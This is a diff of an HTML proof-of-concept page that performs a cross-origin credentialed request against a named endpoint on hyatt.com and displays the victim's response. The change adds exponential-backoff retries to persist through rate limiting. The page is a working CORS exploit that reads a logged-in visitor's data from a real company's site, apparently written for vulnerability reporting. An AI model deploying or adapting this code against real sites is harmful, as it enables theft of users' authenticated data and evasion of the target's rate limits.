@@ -2,28 +2,46 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Hyatt CORS PoC</title>
+  <title>Hyatt CORS PoC with Exponential Backoff</title>
 </head>
 <body>
   <h1>Hyatt CORS PoC</h1>
   <div id="result">Attempting to fetch sensitive data...</div>
   <script>
-    // This PoC is hosted on "https://mrisa.github.io/poc/".
-    // It sends an XMLHttpRequest to the target (e.g., a protected endpoint on www.hyatt.com).
-    var xhr = new XMLHttpRequest();
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState === XMLHttpRequest.DONE) {
-        if (xhr.status === 200) {
-          document.getElementById("result").innerHTML = "<pre>" + xhr.responseText + "</pre>";
-        } else {
-          document.getElementById("result").innerText = "Request failed with status: " + xhr.status;
+    var retryCount = 0;
+    var maxRetries = 10;
+    var baseDelay = 5000; // initial delay: 5 seconds
+    var currentDelay = baseDelay;
+
+    function fetchData() {
+      var xhr = new XMLHttpRequest();
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+          if (xhr.status === 200) {
+            document.getElementById("result").innerHTML = "<pre>" + xhr.responseText + "</pre>";
+          } else if (xhr.status === 429) {
+            retryCount++;
+            if (retryCount <= maxRetries) {
+              document.getElementById("result").innerText =
+                "Rate limit reached (429). Retrying in " + (currentDelay/1000) + " seconds... (Attempt " + retryCount + " of " + maxRetries + ")";
+              setTimeout(fetchData, currentDelay);
+              currentDelay *= 2; // Exponential backoff: double the delay
+            } else {
+              document.getElementById("result").innerText = "Max retry attempts reached. Please try again later.";
+            }
+          } else {
+            document.getElementById("result").innerText = "Request failed with status: " + xhr.status;
+          }
         }
-      }
-    };
-    // Replace the URL below with the specific endpoint you want to test.
-    xhr.open("GET", "https://www.hyatt.com/protected-resource", true);
-    xhr.withCredentials = true; // Include cookies if applicable.
-    xhr.send();
+      };
+      // Replace with the specific endpoint to test, if needed.
+      xhr.open("GET", "https://www.hyatt.com/protected-resource", true);
+      xhr.withCredentials = true; // Include credentials if required.
+      xhr.send();
+    }
+    
+    // Start the PoC request.
+    fetchData();
   </script>
 </body>
 </html>
